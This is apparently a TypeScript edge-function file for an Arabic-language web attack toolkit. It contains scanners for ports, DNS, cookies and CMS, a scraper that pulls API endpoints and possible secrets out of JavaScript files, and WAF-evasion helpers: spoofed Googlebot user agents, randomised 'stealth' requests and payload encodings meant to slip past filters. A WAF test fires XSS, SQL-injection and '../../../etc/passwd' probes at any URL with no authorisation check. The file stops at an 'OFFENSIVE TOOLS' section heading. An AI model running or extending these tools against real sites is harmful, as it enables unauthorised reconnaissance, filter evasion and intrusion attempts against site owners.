import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { encode as base64Encode, decode as base64Decode } from "https://deno.land/std@0.168.0/encoding/base64.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

// ===== WAF EVASION HELPERS =====

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Googlebot/2.1 (+http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
];

function randomUA(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function randomDelay(): Promise<void> {
  return new Promise(r => setTimeout(r, Math.floor(Math.random() * 500) + 100));
}

// Stealthy fetch with WAF evasion headers
async function stealthFetch(url: string, options: RequestInit = {}): Promise<Response> {
  const headers = new Headers(options.headers || {});
  if (!headers.has("User-Agent")) headers.set("User-Agent", randomUA());
  if (!headers.has("Accept")) headers.set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
  if (!headers.has("Accept-Language")) headers.set("Accept-Language", "en-US,en;q=0.9,ar;q=0.8");
  headers.set("Accept-Encoding", "gzip, deflate");
  headers.set("Connection", "keep-alive");
  headers.set("Cache-Control", "no-cache");
  // Add random referer to look legitimate
  try { const u = new URL(url); headers.set("Referer", `${u.protocol}//${u.hostname}/`); } catch {}
  
  await randomDelay();
  return fetch(url, { ...options, headers, redirect: options.redirect || "follow" });
}

// WAF evasion payload encodings
function wafEncodePayload(payload: string): string[] {
  return [
    payload,
    // Double URL encoding
    encodeURIComponent(encodeURIComponent(payload)),
    // Unicode encoding
    payload.split("").map(c => `%u00${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join(""),
    // Mixed case
    payload.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(""),
    // HTML entity encoding
    payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"),
    // Tab/newline insertion
    payload.split("").join("\t"),
    // Comment insertion (for SQL)
    payload.replace(/ /g, "/**/"),
    // Null byte
    payload + "%00",
  ];
}

// Detect WAF block response
function isWafBlocked(resp: Response, body?: string): { blocked: boolean; wafName: string } {
  const status = resp.status;
  const headers = Object.fromEntries(resp.headers.entries());
  
  // Status code detection
  if (status === 403 || status === 406 || status === 429 || status === 503) {
    // Check specific WAF signatures
    if (headers["cf-ray"]) return { blocked: true, wafName: "Cloudflare" };
    if (headers["x-sucuri-id"]) return { blocked: true, wafName: "Sucuri" };
    if (headers["x-amzn-requestid"]) return { blocked: true, wafName: "AWS WAF" };
    if (headers["x-iinfo"]) return { blocked: true, wafName: "Imperva" };
    if (headers["server"]?.toLowerCase().includes("bigip")) return { blocked: true, wafName: "F5 BIG-IP" };
    if (headers["server"]?.toLowerCase().includes("akamai")) return { blocked: true, wafName: "Akamai" };
    
    if (body) {
      if (body.includes("Cloudflare") || body.includes("cf-browser-verification")) return { blocked: true, wafName: "Cloudflare" };
      if (body.includes("Sucuri")) return { blocked: true, wafName: "Sucuri" };
      if (body.includes("ModSecurity") || body.includes("mod_security")) return { blocked: true, wafName: "ModSecurity" };
      if (body.includes("Wordfence")) return { blocked: true, wafName: "Wordfence" };
      if (body.includes("Akamai")) return { blocked: true, wafName: "Akamai" };
      if (body.includes("DDoS protection")) return { blocked: true, wafName: "DDoS Protection" };
      if (body.includes("Access Denied") || body.includes("Request Blocked")) return { blocked: true, wafName: "Unknown WAF" };
    }
    
    return { blocked: true, wafName: "Unknown" };
  }
  return { blocked: false, wafName: "" };
}

const tools: Record<string, (args: Record<string, string>) => Promise<string>> = {

  // ===== SCANNING TOOLS =====

  async port_scan(args) {
    const { target, ports } = args;
    if (!target || !ports) return "❌ مطلوب: target و ports";
    const portList = ports.split(",").map(p => parseInt(p.trim())).filter(p => p > 0 && p <= 65535).slice(0, 20);
    const results: string[] = [`🔍 فحص المنافذ لـ ${target}\n${"─".repeat(40)}`];
    for (const port of portList) {
      try {
        const conn = await Deno.connect({ hostname: target, port, transport: "tcp" });
        conn.close();
        results.push(`  ✅ المنفذ ${port} - مفتوح (OPEN)`);
      } catch {
        results.push(`  ❌ المنفذ ${port} - مغلق (CLOSED)`);
      }
    }
    results.push(`\n📊 تم فحص ${portList.length} منفذ`);
    return results.join("\n");
  },

  async dns_lookup(args) {
    const { domain } = args;
    if (!domain) return "❌ مطلوب: domain";
    const results: string[] = [`🌐 DNS Lookup: ${domain}\n${"─".repeat(40)}`];
    try { const r = await Deno.resolveDns(domain, "A"); results.push(`\n📌 A Records:`); r.forEach(v => results.push(`  → ${v}`)); } catch { results.push(`  ⚠️ لا توجد سجلات A`); }
    try { const r = await Deno.resolveDns(domain, "AAAA"); results.push(`\n📌 AAAA Records:`); r.forEach(v => results.push(`  → ${v}`)); } catch { results.push(`  ⚠️ لا توجد سجلات AAAA`); }
    try { const r = await Deno.resolveDns(domain, "MX"); results.push(`\n📧 MX Records:`); r.forEach(v => results.push(`  → ${v.exchange} (priority: ${v.preference})`)); } catch { results.push(`  ⚠️ لا توجد سجلات MX`); }
    try { const r = await Deno.resolveDns(domain, "NS"); results.push(`\n🏷️ NS Records:`); r.forEach(v => results.push(`  → ${v}`)); } catch { results.push(`  ⚠️ لا توجد سجلات NS`); }
    try { const r = await Deno.resolveDns(domain, "TXT"); results.push(`\n📝 TXT Records:`); r.forEach(v => results.push(`  → ${v.join("")}`)); } catch { results.push(`  ⚠️ لا توجد سجلات TXT`); }
    return results.join("\n");
  },

  async http_headers(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    try {
      const response = await fetch(url, { method: "HEAD", redirect: "follow" });
      const results: string[] = [`🌐 تحليل HTTP Headers\n${"─".repeat(40)}\n🔗 URL: ${url}\n📊 Status: ${response.status} ${response.statusText}\n`];
      const secHeaders: Record<string, { found: boolean; value: string; importance: string }> = {
        "strict-transport-security": { found: false, value: "", importance: "🔴 حرج" },
        "content-security-policy": { found: false, value: "", importance: "🔴 حرج" },
        "x-content-type-options": { found: false, value: "", importance: "🟡 مهم" },
        "x-frame-options": { found: false, value: "", importance: "🟡 مهم" },
        "x-xss-protection": { found: false, value: "", importance: "🟡 مهم" },
        "referrer-policy": { found: false, value: "", importance: "🟢 مستحسن" },
        "permissions-policy": { found: false, value: "", importance: "🟢 مستحسن" },
      };
      results.push("📋 جميع Headers:");
      response.headers.forEach((value, key) => {
        results.push(`  ${key}: ${value.substring(0, 100)}`);
        if (secHeaders[key.toLowerCase()]) { secHeaders[key.toLowerCase()].found = true; secHeaders[key.toLowerCase()].value = value; }
      });
      results.push(`\n🛡️ تحليل الأمان:`);
      for (const [header, info] of Object.entries(secHeaders)) {
        results.push(info.found ? `  ✅ ${header}: ${info.value.substring(0, 80)}` : `  ❌ ${info.importance} - ${header}: مفقود!`);
      }
      const score = Object.values(secHeaders).filter(h => h.found).length;
      const total = Object.keys(secHeaders).length;
      results.push(`\n📊 نتيجة الأمان: ${score}/${total} (${Math.round(score/total*100)}%)`);
      return results.join("\n");
    } catch (e) { return `❌ فشل الاتصال: ${e instanceof Error ? e.message : "خطأ"}`; }
  },

  async ssl_check(args) {
    const { domain } = args;
    if (!domain) return "❌ مطلوب: domain";
    try {
      const response = await fetch(`https://${domain}`, { method: "HEAD" });
      const results: string[] = [`🔒 فحص SSL/TLS: ${domain}\n${"─".repeat(40)}`];
      if (response.ok || response.status < 500) {
        results.push(`  ✅ اتصال HTTPS ناجح`);
        results.push(`  📊 Status: ${response.status}`);
        const hsts = response.headers.get("strict-transport-security");
        results.push(hsts ? `  ✅ HSTS مفعّل: ${hsts}` : `  ❌ HSTS غير مفعّل`);
      }
      try {
        const httpResp = await fetch(`http://${domain}`, { method: "HEAD", redirect: "manual" });
        if (httpResp.status >= 300 && httpResp.status < 400) {
          const loc = httpResp.headers.get("location");
          results.push(loc?.startsWith("https") ? `  ✅ HTTP → HTTPS إعادة توجيه` : `  ⚠️ إعادة التوجيه ليست إلى HTTPS`);
        } else { results.push(`  ❌ لا توجد إعادة توجيه HTTP → HTTPS`); }
      } catch { results.push(`  ⚠️ لم يتم التحقق من HTTP`); }
      return results.join("\n");
    } catch (e) { return `❌ فشل فحص SSL: ${e instanceof Error ? e.message : "خطأ"}`; }
  },

  async whois(args) {
    const { domain } = args;
    if (!domain) return "❌ مطلوب: domain";
    const results: string[] = [`📋 معلومات النطاق: ${domain}\n${"─".repeat(40)}`];
    try { const r = await Deno.resolveDns(domain, "A"); results.push(`\n🌐 عناوين IP:`); r.forEach(v => results.push(`  → ${v}`)); } catch {}
    try { const r = await Deno.resolveDns(domain, "NS"); results.push(`\n🏷️ NS:`); r.forEach(v => results.push(`  → ${v}`)); } catch {}
    try { const r = await Deno.resolveDns(domain, "MX"); results.push(`\n📧 MX:`); r.forEach(v => results.push(`  → ${v.exchange} (${v.preference})`)); } catch {}
    try {
      const r = await Deno.resolveDns(domain, "TXT"); results.push(`\n📝 TXT:`); r.forEach(v => results.push(`  → ${v.join("")}`));
      const spf = r.find(v => v.join("").includes("v=spf")); const dmarc = r.find(v => v.join("").includes("v=DMARC"));
      results.push(`\n🛡️ أمان البريد:`); results.push(`  ${spf ? "✅" : "❌"} SPF`); results.push(`  ${dmarc ? "✅" : "❌"} DMARC`);
    } catch {}
    return results.join("\n");
  },

  async subnet_calc(args) {
    const { cidr } = args;
    if (!cidr) return "❌ مطلوب: cidr";
    const match = cidr.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)\/(\d+)$/);
    if (!match) return "❌ صيغة CIDR غير صالحة";
    const [, ...o] = match; const prefix = parseInt(o[4]); const ip = o.slice(0, 4).map(Number);
    const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
    const ipNum = (ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]) >>> 0;
    const network = (ipNum & mask) >>> 0; const broadcast = (network | ~mask) >>> 0;
    const hosts = Math.max(0, Math.pow(2, 32 - prefix) - 2);
    const n2i = (n: number) => `${(n>>>24)&255}.${(n>>>16)&255}.${(n>>>8)&255}.${n&255}`;
    return [`🔢 حاسبة الشبكة الفرعية`, `${"─".repeat(40)}`, `📌 CIDR: ${cidr}`, `🌐 الشبكة: ${n2i(network)}`, `📡 البث: ${n2i(broadcast)}`, `🎭 القناع: ${n2i(mask)}`, `🏠 أول: ${n2i(network+1)}`, `🏢 آخر: ${n2i(broadcast-1)}`, `📊 المضيفين: ${hosts.toLocaleString()}`, `📏 بادئة: /${prefix}`].join("\n");
  },

  async tech_detect(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    try {
      const resp = await fetch(url, { redirect: "follow" });
      const html = await resp.text();
      const headers = Object.fromEntries(resp.headers.entries());
      const results: string[] = [`🕵️ كشف التقنيات: ${url}\n${"─".repeat(40)}`];
      const techs: { name: string; detected: boolean; detail?: string }[] = [];
      if (headers["server"]) techs.push({ name: "Server", detected: true, detail: headers["server"] });
      if (headers["x-powered-by"]) techs.push({ name: "X-Powered-By", detected: true, detail: headers["x-powered-by"] });
      techs.push({ name: "React", detected: html.includes("__NEXT_DATA__") || html.includes("react") || html.includes("_react") });
      techs.push({ name: "Next.js", detected: html.includes("__NEXT_DATA__") || html.includes("/_next/") });
      techs.push({ name: "Vue.js", detected: html.includes("__vue") || html.includes("vue.") });
      techs.push({ name: "Angular", detected: html.includes("ng-version") || html.includes("angular") });
      techs.push({ name: "WordPress", detected: html.includes("wp-content") || html.includes("wp-includes") });
      techs.push({ name: "jQuery", detected: html.includes("jquery") });
      techs.push({ name: "Bootstrap", detected: html.includes("bootstrap") });
      techs.push({ name: "Tailwind CSS", detected: html.includes("tailwind") || /class="[^"]*(?:flex|grid|px-|py-|mt-|mb-|text-)[^"]*"/.test(html) });
      techs.push({ name: "Cloudflare", detected: !!headers["cf-ray"] || html.includes("cloudflare") });
      techs.push({ name: "PHP", detected: html.includes(".php") || headers["x-powered-by"]?.includes("PHP") || false });
      techs.push({ name: "Shopify", detected: html.includes("shopify") || html.includes("cdn.shopify.com") });
      const detected = techs.filter(t => t.detected);
      const notDetected = techs.filter(t => !t.detected);
      results.push(`\n✅ تقنيات مكتشفة (${detected.length}):`);
      detected.forEach(t => results.push(`  🟢 ${t.name}${t.detail ? `: ${t.detail}` : ""}`));
      if (notDetected.length > 0) { results.push(`\n❌ غير مكتشفة (${notDetected.length}):`); notDetected.forEach(t => results.push(`  ⚪ ${t.name}`)); }
      return results.join("\n");
    } catch (e) { return `❌ فشل: ${e instanceof Error ? e.message : "خطأ"}`; }
  },

  async email_security(args) {
    const { domain } = args;
    if (!domain) return "❌ مطلوب: domain";
    const results: string[] = [`📧 فحص أمان البريد: ${domain}\n${"─".repeat(40)}`];
    let score = 0; const total = 4;
    try { const txt = await Deno.resolveDns(domain, "TXT"); const spf = txt.find(r => r.join("").startsWith("v=spf1")); if (spf) { results.push(`\n✅ SPF: ${spf.join("")}`); score++; } else results.push(`\n❌ SPF غير موجود`); } catch { results.push(`\n❌ فشل فحص SPF`); }
    try { const txt = await Deno.resolveDns(`_dmarc.${domain}`, "TXT"); const dmarc = txt.find(r => r.join("").startsWith("v=DMARC1")); if (dmarc) { results.push(`✅ DMARC: ${dmarc.join("")}`); score++; } else results.push(`❌ DMARC غير موجود`); } catch { results.push(`❌ فشل فحص DMARC`); }
    const dkimSelectors = ["default", "google", "selector1", "selector2", "k1"];
    let dkimFound = false;
    for (const sel of dkimSelectors) { try { const txt = await Deno.resolveDns(`${sel}._domainkey.${domain}`, "TXT"); if (txt.length > 0) { results.push(`✅ DKIM (${sel})`); dkimFound = true; score++; break; } } catch {} }
    if (!dkimFound) results.push(`⚠️ DKIM غير موجود`);
    try { const mx = await Deno.resolveDns(domain, "MX"); if (mx.length > 0) { results.push(`✅ MX: ${mx.map(r => r.exchange).join(", ")}`); score++; } } catch {}
    results.push(`\n📊 نتيجة: ${score}/${total} (${Math.round(score/total*100)}%)`);
    return results.join("\n");
  },

  async reverse_dns(args) {
    const { ip } = args;
    if (!ip) return "❌ مطلوب: ip";
    const results: string[] = [`🔄 DNS عكسي: ${ip}\n${"─".repeat(40)}`];
    try {
      const parts = ip.split(".").reverse().join(".") + ".in-addr.arpa";
      try { const ptr = await Deno.resolveDns(parts, "PTR"); results.push(`✅ PTR:`); ptr.forEach(r => results.push(`  → ${r}`)); } catch { results.push(`❌ لا يوجد PTR`); }
      try { const resp = await fetch(`https://dns.google/resolve?name=${parts}&type=PTR`); const data = await resp.json(); if (data.Answer) data.Answer.forEach((a: any) => results.push(`  → ${a.data}`)); } catch {}
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async ping_check(args) {
    const { target, port = "443" } = args;
    if (!target) return "❌ مطلوب: target";
    const p = parseInt(port) || 443;
    const results: string[] = [`📡 فحص التوفر: ${target}:${p}\n${"─".repeat(40)}`];
    const times: number[] = [];
    for (let i = 0; i < 5; i++) {
      const start = performance.now();
      try { const conn = await Deno.connect({ hostname: target, port: p, transport: "tcp" }); const elapsed = performance.now() - start; conn.close(); times.push(elapsed); results.push(`  محاولة ${i+1}: ✅ ${elapsed.toFixed(1)}ms`); } catch { results.push(`  محاولة ${i+1}: ❌ فشل`); }
    }
    if (times.length > 0) { const avg = times.reduce((a,b)=>a+b,0)/times.length; results.push(`\n📊 أقل: ${Math.min(...times).toFixed(1)}ms | متوسط: ${avg.toFixed(1)}ms | أعلى: ${Math.max(...times).toFixed(1)}ms`); }
    return results.join("\n");
  },

  // --- NEW SCANNING TOOLS ---

  async traceroute(args) {
    const { target } = args;
    if (!target) return "❌ مطلوب: target";
    const results: string[] = [`🗺️ تتبع المسار: ${target}\n${"─".repeat(40)}`];
    try {
      const ips = await Deno.resolveDns(target, "A");
      results.push(`📌 IP: ${ips.join(", ")}`);
      // Simulate traceroute via DNS and HTTP timing
      const start = performance.now();
      try { const conn = await Deno.connect({ hostname: target, port: 443, transport: "tcp" }); const elapsed = performance.now() - start; conn.close(); results.push(`\n⏱️ وقت الوصول: ${elapsed.toFixed(1)}ms`); } catch { results.push(`\n❌ لم يتم الوصول للمنفذ 443`); }
      // Check NS path
      try { const ns = await Deno.resolveDns(target, "NS"); results.push(`\n🏷️ خوادم DNS:`); ns.forEach((n, i) => results.push(`  ${i+1}. ${n}`)); } catch {}
      try { const resp = await fetch(`https://dns.google/resolve?name=${target}&type=A`); const data = await resp.json(); if (data.Answer) { results.push(`\n🌐 مسار DNS:`); data.Answer.forEach((a: any, i: number) => results.push(`  ${i+1}. ${a.name} → ${a.data} (TTL: ${a.TTL})`)); } } catch {}
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async geo_ip(args) {
    const { ip } = args;
    if (!ip) return "❌ مطلوب: ip";
    const results: string[] = [`📍 موقع IP: ${ip}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(`http://ip-api.com/json/${ip}?lang=ar`);
      const data = await resp.json();
      if (data.status === "success") {
        results.push(`🌍 الدولة: ${data.country} (${data.countryCode})`);
        results.push(`🏙️ المدينة: ${data.city}`);
        results.push(`📍 المنطقة: ${data.regionName}`);
        results.push(`🏢 المزود: ${data.isp}`);
        results.push(`🏛️ المنظمة: ${data.org}`);
        results.push(`📡 AS: ${data.as}`);
        results.push(`🗺️ الإحداثيات: ${data.lat}, ${data.lon}`);
        results.push(`⏰ المنطقة الزمنية: ${data.timezone}`);
      } else { results.push(`❌ فشل: ${data.message || "غير معروف"}`); }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async asn_lookup(args) {
    const { ip } = args;
    if (!ip) return "❌ مطلوب: ip";
    const results: string[] = [`🏢 ASN Lookup: ${ip}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(`http://ip-api.com/json/${ip}?fields=as,isp,org,query`);
      const data = await resp.json();
      results.push(`📡 AS: ${data.as || "غير معروف"}`);
      results.push(`🏢 ISP: ${data.isp || "غير معروف"}`);
      results.push(`🏛️ المنظمة: ${data.org || "غير معروف"}`);
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async robots_check(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const base = url.replace(/\/+$/, "");
    const results: string[] = [`🤖 تحليل Robots.txt: ${base}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(`${base}/robots.txt`);
      if (resp.ok) {
        const text = await resp.text();
        results.push(`✅ الملف موجود (${text.length} بايت)\n`);
        const disallowed = text.match(/Disallow:\s*(.+)/gi) || [];
        const sitemaps = text.match(/Sitemap:\s*(.+)/gi) || [];
        if (disallowed.length > 0) { results.push(`🚫 المسارات المحظورة (${disallowed.length}):`); disallowed.slice(0, 20).forEach(d => results.push(`  ${d.trim()}`)); }
        if (sitemaps.length > 0) { results.push(`\n🗂️ Sitemaps:`); sitemaps.forEach(s => results.push(`  ${s.trim()}`)); }
        // Interesting paths
        const interesting = disallowed.filter(d => /admin|login|api|backup|config|secret|private|internal|debug|test/i.test(d));
        if (interesting.length > 0) { results.push(`\n⚠️ مسارات مثيرة للاهتمام:`); interesting.forEach(d => results.push(`  🔍 ${d.trim()}`)); }
      } else { results.push(`❌ الملف غير موجود (${resp.status})`); await resp.text(); }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async sitemap_check(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const base = url.replace(/\/+$/, "");
    const results: string[] = [`🗂️ تحليل Sitemap: ${base}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(`${base}/sitemap.xml`);
      if (resp.ok) {
        const text = await resp.text();
        const urls = text.match(/<loc>([^<]+)<\/loc>/gi) || [];
        results.push(`✅ الملف موجود (${text.length} بايت)`);
        results.push(`📊 عدد الروابط: ${urls.length}`);
        if (urls.length > 0) { results.push(`\n📄 أول 15 رابط:`); urls.slice(0, 15).forEach(u => results.push(`  → ${u.replace(/<\/?loc>/gi, "")}`)); }
      } else { results.push(`❌ الملف غير موجود (${resp.status})`); await resp.text(); }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async cookie_analyzer(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🍪 تحليل الكوكيز: ${url}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(url, { redirect: "follow" });
      await resp.text();
      const cookies = resp.headers.get("set-cookie");
      if (cookies) {
        results.push(`✅ الكوكيز الموجودة:\n`);
        const cookieList = cookies.split(/,(?=[^ ])/);
        for (const cookie of cookieList.slice(0, 10)) {
          const name = cookie.split("=")[0].trim();
          results.push(`  🍪 ${name}`);
          results.push(`    ${cookie.includes("Secure") ? "✅" : "❌"} Secure`);
          results.push(`    ${cookie.includes("HttpOnly") ? "✅" : "❌"} HttpOnly`);
          results.push(`    ${cookie.includes("SameSite") ? "✅" : "❌"} SameSite`);
        }
      } else { results.push(`ℹ️ لا توجد كوكيز في الاستجابة`); }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async cms_detect(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🖥️ كشف CMS: ${url}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(url, { redirect: "follow" });
      const html = await resp.text();
      const headers = Object.fromEntries(resp.headers.entries());
      const cms: { name: string; detected: boolean; evidence: string }[] = [
        { name: "WordPress", detected: html.includes("wp-content") || html.includes("wp-includes"), evidence: "wp-content/wp-includes" },
        { name: "Joomla", detected: html.includes("/media/jui/") || html.includes("Joomla"), evidence: "Joomla paths" },
        { name: "Drupal", detected: html.includes("Drupal") || html.includes("/sites/default/"), evidence: "Drupal paths" },
        { name: "Shopify", detected: html.includes("cdn.shopify.com"), evidence: "Shopify CDN" },
        { name: "Wix", detected: html.includes("wix.com") || html.includes("wixstatic"), evidence: "Wix assets" },
        { name: "Squarespace", detected: html.includes("squarespace"), evidence: "Squarespace" },
        { name: "Ghost", detected: html.includes("ghost.org") || html.includes("ghost-"), evidence: "Ghost" },
        { name: "Magento", detected: html.includes("Mage.Cookies") || html.includes("magento"), evidence: "Magento" },
        { name: "PrestaShop", detected: html.includes("prestashop"), evidence: "PrestaShop" },
        { name: "Laravel", detected: !!headers["set-cookie"]?.includes("laravel") || html.includes("csrf-token"), evidence: "Laravel session" },
      ];
      const detected = cms.filter(c => c.detected);
      if (detected.length > 0) { results.push(`\n✅ CMS مكتشف:`); detected.forEach(c => results.push(`  🟢 ${c.name} (${c.evidence})`)); }
      else { results.push(`\nℹ️ لم يتم اكتشاف CMS معروف`); }
      const gen = html.match(/<meta[^>]*name="generator"[^>]*content="([^"]+)"/i);
      if (gen) results.push(`\n🔧 Generator: ${gen[1]}`);
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async waf_detect(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🧱 كشف WAF المتقدم: ${url}\n${"─".repeat(40)}`];
    try {
      const resp = await stealthFetch(url);
      const body = await resp.text();
      const headers = Object.fromEntries(resp.headers.entries());
      const wafs: { name: string; detected: boolean; evidence: string }[] = [
        { name: "Cloudflare", detected: !!headers["cf-ray"] || !!headers["cf-cache-status"] || body.includes("cloudflare"), evidence: headers["cf-ray"] || "cf headers" },
        { name: "AWS WAF/CloudFront", detected: !!headers["x-amzn-requestid"] || !!headers["x-amz-cf-id"] || !!headers["x-amz-cf-pop"], evidence: "AWS headers" },
        { name: "Akamai", detected: !!headers["x-akamai-transformed"] || body.includes("akamai"), evidence: "Akamai headers" },
        { name: "Sucuri", detected: !!headers["x-sucuri-id"] || body.includes("sucuri"), evidence: headers["x-sucuri-id"] || "sucuri" },
        { name: "Imperva/Incapsula", detected: !!headers["x-iinfo"] || !!headers["x-cdn"] || body.includes("incapsula"), evidence: "Imperva headers" },
        { name: "F5 BIG-IP", detected: !!headers["x-cnection"] || !!headers["x-wa-info"] || headers["server"]?.toLowerCase().includes("bigip") || false, evidence: "F5 headers" },
        { name: "ModSecurity", detected: body.includes("ModSecurity") || body.includes("mod_security") || headers["server"]?.includes("mod_security") || false, evidence: "ModSecurity" },
        { name: "Wordfence", detected: body.includes("wordfence") || body.includes("wfAction"), evidence: "Wordfence" },
        { name: "DDoS-Guard", detected: !!headers["x-ddos-protection"] || body.includes("ddos-guard"), evidence: "DDoS-Guard" },
        { name: "Fortinet FortiWeb", detected: !!headers["fortiwafsid"] || body.includes("fortigate"), evidence: "Fortinet" },
        { name: "Barracuda", detected: !!headers["barra_counter_session"] || body.includes("barracuda"), evidence: "Barracuda" },
      ];
      const detected = wafs.filter(w => w.detected);
      if (detected.length > 0) { 
        results.push(`\n🛡️ WAF مكتشف (${detected.length}):`); 
        detected.forEach(w => results.push(`  🔴 ${w.name} (${w.evidence})`)); 
      } else { 
        results.push(`\nℹ️ لم يتم اكتشاف WAF معروف من Headers`); 
      }
      
      // Test WAF blocking behavior
      results.push(`\n📊 اختبار سلوك الحظر:`);
      const tests = [
        { name: "XSS Payload", path: "?x=<script>alert(1)</script>" },
        { name: "SQLi Payload", path: "?x=' OR 1=1--" },
        { name: "Path Traversal", path: "?x=../../../etc/passwd" },
      ];
      for (const test of tests) {
        try {
          const testResp = await stealthFetch(`${url}${test.path}`);
          const testBody = await testResp.text();
          const waf = isWafBlocked(testResp, testBody);
          results.push(`  ${waf.blocked ? `🧱 ${test.name}: محظور (${waf.wafName})` : `✅ ${test.name}: مرّ (${testResp.status})`}`);
        } catch { results.push(`  ❌ ${test.name}: فشل`); }
      }
      
      if (detected.length > 0) {
        results.push(`\n💡 نصائح التجاوز:`);
        results.push(`  → استخدم waf_bypass_test لاختبار تقنيات التجاوز`);
        results.push(`  → استخدم waf_fingerprint لتحليل أعمق`);
        results.push(`  → استخدم rate_limit_test لمعرفة حدود الطلبات`);
      }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async link_extractor(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🔗 استخراج الروابط: ${url}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(url, { redirect: "follow" });
      const html = await resp.text();
      const links = new Set<string>();
      const matches = html.matchAll(/(?:href|src)=["']([^"']+)["']/gi);
      for (const m of matches) links.add(m[1]);
      const internal = [...links].filter(l => l.startsWith("/") || l.includes(new URL(url).hostname));
      const external = [...links].filter(l => l.startsWith("http") && !l.includes(new URL(url).hostname));
      results.push(`📊 إجمالي: ${links.size} | داخلي: ${internal.length} | خارجي: ${external.length}`);
      if (internal.length > 0) { results.push(`\n🏠 روابط داخلية (${Math.min(internal.length, 15)}):`); internal.slice(0, 15).forEach(l => results.push(`  → ${l}`)); }
      if (external.length > 0) { results.push(`\n🌍 روابط خارجية (${Math.min(external.length, 15)}):`); external.slice(0, 15).forEach(l => results.push(`  → ${l}`)); }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async js_file_scanner(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`📜 فحص ملفات JS: ${url}\n${"─".repeat(40)}`];
    try {
      const resp = await fetch(url, { redirect: "follow" });
      const html = await resp.text();
      const jsFiles = new Set<string>();
      const matches = html.matchAll(/src=["']([^"']*\.js[^"']*)["']/gi);
      for (const m of matches) jsFiles.add(m[1]);
      results.push(`📊 عدد ملفات JS: ${jsFiles.size}\n`);
      for (const jsFile of [...jsFiles].slice(0, 10)) {
        results.push(`📄 ${jsFile}`);
        try {
          const jsUrl = jsFile.startsWith("http") ? jsFile : new URL(jsFile, url).href;
          const jsResp = await fetch(jsUrl);
          const jsContent = await jsResp.text();
          // Look for endpoints
          const endpoints = jsContent.match(/["'](\/api\/[^"']+|\/v\d+\/[^"']+)["']/g) || [];
          if (endpoints.length > 0) { results.push(`  🔗 Endpoints:`); endpoints.slice(0, 5).forEach(e => results.push(`    → ${e}`)); }
          // Look for secrets patterns
          const secrets = jsContent.match(/(?:api[_-]?key|secret|token|password|auth)\s*[:=]\s*["'][^"']+["']/gi) || [];
          if (secrets.length > 0) { results.push(`  ⚠️ أسرار محتملة:`); secrets.slice(0, 3).forEach(s => results.push(`    → ${s.substring(0, 60)}`)); }
        } catch {}
      }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  // ===== OFFENSIVE TOOLS =====

  async dir_bruteforce(args) {
